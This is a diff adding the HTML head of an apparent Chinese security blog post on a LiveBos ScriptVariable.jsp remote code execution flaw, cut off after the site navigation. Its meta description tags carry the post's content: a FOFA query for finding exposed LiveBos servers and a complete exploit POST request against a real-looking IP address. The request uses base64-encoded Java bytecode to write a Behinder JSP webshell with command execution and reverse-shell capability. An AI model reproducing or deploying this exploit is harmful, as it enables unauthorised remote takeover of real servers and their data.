@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>LiveBos ScriptVariable.jsp 远程代码执行漏洞 - Chinchin&#39;s blog</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="LiveBos ScriptVariable.jsp 远程代码执行漏洞" />
+<meta property="og:description" content="## fofa 1 body=&#34;LiveBos&#34; || body=&#34;/react/browser/loginBackground.png&#34; poc 写入冰蝎 1 1 2 3 4 5 6 7 8 POST /plug-in/common/ScriptVariable.jsp;.css.jsp HTTP/1.1 Host: 112.35.7.97:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 6577 act=put&amp;scope=0&amp;name=gName13&amp;value=content%3Dorg.apache.commons.codec.binary.StringUtils.newString%28java.lang.Class.forName%28%22org.apache.commons.codec.binary.Base64%22%29.newInstance%28%29.decodeBase64%28%22PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4%3D%22%29%2C%22UTF-8%22%29%2B%22%22%3Bbytes%3Djava.lang.Class.forName%28%22org.apache.commons.codec.binary.Base64%22%29.newInstance%28%29.decode%28%22yv66vgAAADEA5AoATgBcCABdCgAcAF4IAF8KABwAYAgAYQoAHABiCgAcAGMIAGQKABwAZQgAZgoAZwBoCgBNAGkIAGoKAE0AawgAbAoAbQBuCgAcAG8IAHAKABwAcQgAcggAcwcAdAoAFwBcCgAXAHUIAHYKABcAdwcAeAgAeQgAeggAewgAfAgAfQoAfgB%2FCgB%2BAIAHAIEKAIIAgwoAJACECACFCgAkAIYKACQAhwoAJACICgCCAIkKAIIAigcAiwoALQB3CACMCgAcAI0IAI4KAH4AjwcAkAoAZwCRCgAzAJIKADMAgwoAggCTCgAzAJMKADMAlAoAlQCWCgCVAJcKAJgAmQoAmACaBQAAAAAAAAAyCgCbAJwKAIIAnQoAMwCeCACfCgAtAKAIAKEIAKIHAKMKAEcAjQoAHACkCgBHAKUKAEcAmggApgcApwcAqAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdleGVjdXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARleGVjAQAHcmV2ZXJzZQEAOShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0ludGVnZXI7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAHQzEuamF2YQwATwBQAQAADACpAKoBABBjb21tYW5kIG5vdCBudWxsDACrAKwBAAUjIyMjIwwArQCuDACvALABAAE6DACxALIBACJjb21tYW5kIHJldmVyc2UgaG9zdCBmb3JtYXQgZXJyb3IhBwCzDAC0ALUMAFYAVwEABUBAQEBADABVAFQBAAdvcy5uYW1lBwC2DAC3AFQMALgArAEAA3dpbgwAuQC6AQAEcGluZwEAAi1uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMALsAvAEABSAtbiA0DAC9AKwBABBqYXZhL2xhbmcvU3RyaW5nAQADY21kAQACL2MBAAUgLXQgNAEAAnNoAQACLWMHAL4MAL8AwAwAVQDBAQARamF2YS91dGlsL1NjYW5uZXIHAMIMAMMAxAwATwDFAQACXGEMAMYAxwwAyADJDADKAKwMAMsAxAwAzABQAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABy9iaW4vc2gMAE8AzQEAB2NtZC5leGUMAFUAzgEAD2phdmEvbmV0L1NvY2tldAwAzwDQDABPANEMANIA0wwA1ADJBwDVDADWANAMANcA0AcA2AwAWADZDADaAFAHANsMANwA3QwA3gDQDADfAFABAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwA4ACsAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEBABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MAOEA4gwAWADjAQACb2sBAAJDMQEAEGphdmEvbGFuZy9PYmplY3QBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAR0cmltAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvSW50ZWdlcgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvSW50ZWdlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAA5nZXRFcnJvclN0cmVhbQEAB2Rlc3Ryb3kBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAAhpbnRWYWx1ZQEAAygpSQEAFihMamF2YS9sYW5nL1N0cmluZztJKVYBAA9nZXRPdXRwdXRTdHJlYW0BABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAhpc0Nsb3NlZAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAlhdmFpbGFibGUBAARyZWFkAQAUamF2YS9pby9PdXRwdXRTdHJlYW0BAAQoSSlWAQAFZmx1c2gBABBqYXZhL2xhbmcvVGhyZWFkAQAFc2xlZXABAAQoSilWAQAJZXhpdFZhbHVlAQAFY2xvc2UBAApnZXRNZXNzYWdlAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAFKFtCKVYAIQBNAE4AAAAAAAUAAQBPAFAAAQBRAAAAHQABAAEAAAAFKrcAAbEAAAABAFIAAAAGAAEAAAANAAEAUwBUAAEAUQAAAI8ABAADAAAAVyvGAAwSAiu2AAOZAAYSBLArtgAFTCsSBrYAB5kAKCsSBhICtgAIEgm2AApNLL4FnwAGEguwKiwDMiwEMrgADLYADbAqKxIGEgK2AAgSDhICtgAItgAPsAAAAAEAUgAAACYACQAAABUADQAWABAAGAAVABkAHgAbACwAHAAyAB0ANQAfAEMAIQABAFUAVAABAFEAAAHOAAQACQAAASoSELgAEbYAEk0rtgAFTAFOAToELBITtgAUmQBAKxIVtgAUmQAgKxIWtgAUmgAXuwAXWbcAGCu2ABkSGrYAGbYAG0wGvQAcWQMSHVNZBBIeU1kFK1M6BKcAPSsSFbYAFJkAICsSFrYAFJoAF7sAF1m3ABgrtgAZEh%2B2ABm2ABtMBr0AHFkDEiBTWQQSIVNZBStTOgS4ACIZBLYAI067ACRZLbYAJbcAJhIntgAoOgUZBbYAKZkACxkFtgAqpwAFEgI6BrsAJFkttgArtwAmEie2ACg6BbsAF1m3ABgZBrYAGRkFtgApmQALGQW2ACqnAAUSArYAGbYAGzoGGQY6By3GAActtgAsGQewOgUZBbYALjoGLcYABy22ACwZBrA6CC3GAActtgAsGQi%2FAAQAkwD%2BAQkALQCTAP4BHQAAAQkBEgEdAAABHQEfAR0AAAABAFIAAAByABwAAAAlAAkAJgAOACcAEAAoABMAKQAcACoALgArAEIALQBZAC8AawAwAH8AMgCTADUAnAA2AK4ANwDCADgA1AA5APoAOgD%2BAD4BAgA%2FAQYAOgEJADsBCwA8ARIAPgEWAD8BGgA8AR0APgEjAD8BJwBBAAEAVgBXAAEAUQAAAYMABAAMAAAA8xIQuAARtgASEhO2ABSaABC7ABxZEi%2B3ADBOpwANuwAcWRIxtwAwTrgAIi22ADI6BLsAM1krLLYANLcANToFGQS2ACU6BhkEtgArOgcZBbYANjoIGQS2ADc6CRkFtgA4OgoZBbYAOZoAYBkGtgA6ngAQGQoZBrYAO7YAPKf%2F7hkHtgA6ngAQGQoZB7YAO7YAPKf%2F7hkItgA6ngAQGQkZCLYAO7YAPKf%2F7hkKtgA9GQm2AD0UAD64AEAZBLYAQVenAAg6C6f%2FnhkEtgAsGQW2AEKnACBOuwAXWbcAGBJDtgAZLbYARLYAGRJFtgAZtgAbsBJGsAACALgAvgDBAC0AAADQANMALQABAFIAAABuABsAAABNABAATgAdAFAAJwBSADAAUwA%2BAFQAUwBVAGEAVgBpAFcAcQBYAH4AWgCGAFsAkwBdAJsAXgCoAGAArQBhALIAYgC4AGQAvgBlAMEAZgDDAGcAxgBpAMsAagDQAG0A0wBrANQAbADwAG4AAQBYAFkAAQBRAAAAWQADAAQAAAAhuwBHWSu3AEhOLSy2AEm2AEottgBLpwAJTi22AC6wEkywAAEAAAAVABgALQABAFIAAAAeAAcAAAB5AAkAegARAHsAFQB%2BABgAfAAZAH0AHgB%2FAAEAWgAAAAIAWw%3D%3D%22%29%3BtheUnsafeMethod%3Djava.lang.Class.forName%28%22sun.misc.Unsafe%22%29.getDeclaredField%28%22theUnsafe%22%29%3BtheUnsafeMethod.setAccessible%28true%29%3Bunsafe%3DtheUnsafeMethod.get%28null%29%3BclassLoader%3Dnew&#43;java.net.URLClassLoader%28java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.net.URL%22%29%2C&#43;0%29%29%3BprotectionDomain%3Dnew&#43;java.security.ProtectionDomain%28new&#43;java.security.CodeSource%28null%2C&#43;java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.security.cert.Certificate%22%29%2C&#43;0%29%29%2C&#43;null%2C&#43;classLoader%2C&#43;%5B%5D%29%3Bclz&#43;%3D&#43;unsafe.defineClass%28null%2C&#43;bytes%2C&#43;0%2C&#43;bytes.length%2C&#43;classLoader%2C&#43;protectionDomain%29%3Bj%3Dclz.newInstance%28%29.write%28%22..%2FLiveBOS%2FFormBuilder%2F5aB7Bc80daBC3d56.jsp%22%2C&#43;content%29%2B%22%22%3B 2 1 2 3 4 5 6 7 8 POST /plug-in/common/ScriptVariable.jsp;.css.jsp HTTP/1.1 Host: 112.35.7.97:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML," />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><meta property="og:image" content="http://example.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-08T01:08:29+08:00" />
+<meta property="article:modified_time" content="2023-12-08T01:08:29+08:00" /><meta property="og:site_name" content="Chinchin&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://example.org/logo.png"/>
+
+<meta name="twitter:title" content="LiveBos ScriptVariable.jsp 远程代码执行漏洞"/>
+<meta name="twitter:description" content="## fofa 1 body=&#34;LiveBos&#34; || body=&#34;/react/browser/loginBackground.png&#34; poc 写入冰蝎 1 1 2 3 4 5 6 7 8 POST /plug-in/common/ScriptVariable.jsp;.css.jsp HTTP/1.1 Host: 112.35.7.97:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip Content-Length: 6577 act=put&amp;scope=0&amp;name=gName13&amp;value=content%3Dorg.apache.commons.codec.binary.StringUtils.newString%28java.lang.Class.forName%28%22org.apache.commons.codec.binary.Base64%22%29.newInstance%28%29.decodeBase64%28%22PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4%3D%22%29%2C%22UTF-8%22%29%2B%22%22%3Bbytes%3Djava.lang.Class.forName%28%22org.apache.commons.codec.binary.Base64%22%29.newInstance%28%29.decode%28%22yv66vgAAADEA5AoATgBcCABdCgAcAF4IAF8KABwAYAgAYQoAHABiCgAcAGMIAGQKABwAZQgAZgoAZwBoCgBNAGkIAGoKAE0AawgAbAoAbQBuCgAcAG8IAHAKABwAcQgAcggAcwcAdAoAFwBcCgAXAHUIAHYKABcAdwcAeAgAeQgAeggAewgAfAgAfQoAfgB%2FCgB%2BAIAHAIEKAIIAgwoAJACECACFCgAkAIYKACQAhwoAJACICgCCAIkKAIIAigcAiwoALQB3CACMCgAcAI0IAI4KAH4AjwcAkAoAZwCRCgAzAJIKADMAgwoAggCTCgAzAJMKADMAlAoAlQCWCgCVAJcKAJgAmQoAmACaBQAAAAAAAAAyCgCbAJwKAIIAnQoAMwCeCACfCgAtAKAIAKEIAKIHAKMKAEcAjQoAHACkCgBHAKUKAEcAmggApgcApwcAqAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdleGVjdXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARleGVjAQAHcmV2ZXJzZQEAOShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0ludGVnZXI7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAHQzEuamF2YQwATwBQAQAADACpAKoBABBjb21tYW5kIG5vdCBudWxsDACrAKwBAAUjIyMjIwwArQCuDACvALABAAE6DACxALIBACJjb21tYW5kIHJldmVyc2UgaG9zdCBmb3JtYXQgZXJyb3IhBwCzDAC0ALUMAFYAVwEABUBAQEBADABVAFQBAAdvcy5uYW1lBwC2DAC3AFQMALgArAEAA3dpbgwAuQC6AQAEcGluZwEAAi1uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMALsAvAEABSAtbiA0DAC9AKwBABBqYXZhL2xhbmcvU3RyaW5nAQADY21kAQACL2MBAAUgLXQgNAEAAnNoAQACLWMHAL4MAL8AwAwAVQDBAQARamF2YS91dGlsL1NjYW5uZXIHAMIMAMMAxAwATwDFAQACXGEMAMYAxwwAyADJDADKAKwMAMsAxAwAzABQAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABy9iaW4vc2gMAE8AzQEAB2NtZC5leGUMAFUAzgEAD2phdmEvbmV0L1NvY2tldAwAzwDQDABPANEMANIA0wwA1ADJBwDVDADWANAMANcA0AcA2AwAWADZDADaAFAHANsMANwA3QwA3gDQDADfAFABAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwA4ACsAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEBABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MAOEA4gwAWADjAQACb2sBAAJDMQEAEGphdmEvbGFuZy9PYmplY3QBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAR0cmltAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvSW50ZWdlcgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvSW50ZWdlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAA5nZXRFcnJvclN0cmVhbQEAB2Rlc3Ryb3kBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAAhpbnRWYWx1ZQEAAygpSQEAFihMamF2YS9sYW5nL1N0cmluZztJKVYBAA9nZXRPdXRwdXRTdHJlYW0BABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAhpc0Nsb3NlZAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAlhdmFpbGFibGUBAARyZWFkAQAUamF2YS9pby9PdXRwdXRTdHJlYW0BAAQoSSlWAQAFZmx1c2gBABBqYXZhL2xhbmcvVGhyZWFkAQAFc2xlZXABAAQoSilWAQAJZXhpdFZhbHVlAQAFY2xvc2UBAApnZXRNZXNzYWdlAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAFKFtCKVYAIQBNAE4AAAAAAAUAAQBPAFAAAQBRAAAAHQABAAEAAAAFKrcAAbEAAAABAFIAAAAGAAEAAAANAAEAUwBUAAEAUQAAAI8ABAADAAAAVyvGAAwSAiu2AAOZAAYSBLArtgAFTCsSBrYAB5kAKCsSBhICtgAIEgm2AApNLL4FnwAGEguwKiwDMiwEMrgADLYADbAqKxIGEgK2AAgSDhICtgAItgAPsAAAAAEAUgAAACYACQAAABUADQAWABAAGAAVABkAHgAbACwAHAAyAB0ANQAfAEMAIQABAFUAVAABAFEAAAHOAAQACQAAASoSELgAEbYAEk0rtgAFTAFOAToELBITtgAUmQBAKxIVtgAUmQAgKxIWtgAUmgAXuwAXWbcAGCu2ABkSGrYAGbYAG0wGvQAcWQMSHVNZBBIeU1kFK1M6BKcAPSsSFbYAFJkAICsSFrYAFJoAF7sAF1m3ABgrtgAZEh%2B2ABm2ABtMBr0AHFkDEiBTWQQSIVNZBStTOgS4ACIZBLYAI067ACRZLbYAJbcAJhIntgAoOgUZBbYAKZkACxkFtgAqpwAFEgI6BrsAJFkttgArtwAmEie2ACg6BbsAF1m3ABgZBrYAGRkFtgApmQALGQW2ACqnAAUSArYAGbYAGzoGGQY6By3GAActtgAsGQewOgUZBbYALjoGLcYABy22ACwZBrA6CC3GAActtgAsGQi%2FAAQAkwD%2BAQkALQCTAP4BHQAAAQkBEgEdAAABHQEfAR0AAAABAFIAAAByABwAAAAlAAkAJgAOACcAEAAoABMAKQAcACoALgArAEIALQBZAC8AawAwAH8AMgCTADUAnAA2AK4ANwDCADgA1AA5APoAOgD%2BAD4BAgA%2FAQYAOgEJADsBCwA8ARIAPgEWAD8BGgA8AR0APgEjAD8BJwBBAAEAVgBXAAEAUQAAAYMABAAMAAAA8xIQuAARtgASEhO2ABSaABC7ABxZEi%2B3ADBOpwANuwAcWRIxtwAwTrgAIi22ADI6BLsAM1krLLYANLcANToFGQS2ACU6BhkEtgArOgcZBbYANjoIGQS2ADc6CRkFtgA4OgoZBbYAOZoAYBkGtgA6ngAQGQoZBrYAO7YAPKf%2F7hkHtgA6ngAQGQoZB7YAO7YAPKf%2F7hkItgA6ngAQGQkZCLYAO7YAPKf%2F7hkKtgA9GQm2AD0UAD64AEAZBLYAQVenAAg6C6f%2FnhkEtgAsGQW2AEKnACBOuwAXWbcAGBJDtgAZLbYARLYAGRJFtgAZtgAbsBJGsAACALgAvgDBAC0AAADQANMALQABAFIAAABuABsAAABNABAATgAdAFAAJwBSADAAUwA%2BAFQAUwBVAGEAVgBpAFcAcQBYAH4AWgCGAFsAkwBdAJsAXgCoAGAArQBhALIAYgC4AGQAvgBlAMEAZgDDAGcAxgBpAMsAagDQAG0A0wBrANQAbADwAG4AAQBYAFkAAQBRAAAAWQADAAQAAAAhuwBHWSu3AEhOLSy2AEm2AEottgBLpwAJTi22AC6wEkywAAEAAAAVABgALQABAFIAAAAeAAcAAAB5AAkAegARAHsAFQB%2BABgAfAAZAH0AHgB%2FAAEAWgAAAAIAWw%3D%3D%22%29%3BtheUnsafeMethod%3Djava.lang.Class.forName%28%22sun.misc.Unsafe%22%29.getDeclaredField%28%22theUnsafe%22%29%3BtheUnsafeMethod.setAccessible%28true%29%3Bunsafe%3DtheUnsafeMethod.get%28null%29%3BclassLoader%3Dnew&#43;java.net.URLClassLoader%28java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.net.URL%22%29%2C&#43;0%29%29%3BprotectionDomain%3Dnew&#43;java.security.ProtectionDomain%28new&#43;java.security.CodeSource%28null%2C&#43;java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.security.cert.Certificate%22%29%2C&#43;0%29%29%2C&#43;null%2C&#43;classLoader%2C&#43;%5B%5D%29%3Bclz&#43;%3D&#43;unsafe.defineClass%28null%2C&#43;bytes%2C&#43;0%2C&#43;bytes.length%2C&#43;classLoader%2C&#43;protectionDomain%29%3Bj%3Dclz.newInstance%28%29.write%28%22..%2FLiveBOS%2FFormBuilder%2F5aB7Bc80daBC3d56.jsp%22%2C&#43;content%29%2B%22%22%3B 2 1 2 3 4 5 6 7 8 POST /plug-in/common/ScriptVariable.jsp;.css.jsp HTTP/1.1 Host: 112.35.7.97:8001 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,"/>
+<meta name="twitter:site" content="@xxxx"/>
+<meta name="application-name" content="Chinchin&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Chinchin&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="http://example.org/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" /><link rel="next" href="http://example.org/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "LiveBos ScriptVariable.jsp 远程代码执行漏洞",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\/"
+        },"genre": "posts","keywords": "2023hw","wordcount":  132 ,
+        "url": "http:\/\/example.org\/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E\/","datePublished": "2023-12-08T01:08:29+08:00","dateModified": "2023-12-08T01:08:29+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Chinchin"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Chinchin&#39;s blog"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
